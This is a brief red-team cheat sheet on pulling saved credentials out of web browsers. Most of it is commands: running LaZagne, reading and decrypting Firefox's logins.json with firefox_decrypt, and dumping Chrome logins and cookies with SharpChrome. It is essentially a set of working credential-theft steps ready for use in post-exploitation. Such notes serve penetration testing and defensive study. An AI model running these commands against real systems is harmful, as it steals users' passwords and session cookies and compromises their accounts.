# Web Browsers

Just like other common programs and applications, most web browsers offer "credential saving" features allowing users to access restricted resources without supplying a username and password every time. The downside of this kind of features is that attackers that have access to the storage of these browsers can potentially extract those credentials

### Dumping secrets

#### General

```sh
https://github.com/AlessandroZ/LaZagne/tree/master
python laZagne.py all 
```

#### Firefox

```shellscript
# Search for firefox creds
# When we store credentials for a web page in the Firefox browser, they are encrypted 
# and stored in logins.json
ls -l .mozilla/firefox/ | grep default 
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# If we find any, try do decrypt them
https://github.com/unode/firefox_decrypt
python3.9 firefox_decrypt.py
```

#### Chrome

```shellscript
# Must be run from the session of the user we want to collect from 
https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.7_Any/SharpChrome.exe
.\SharpChrome.exe <logins | cookies> /unprotect /showall
```
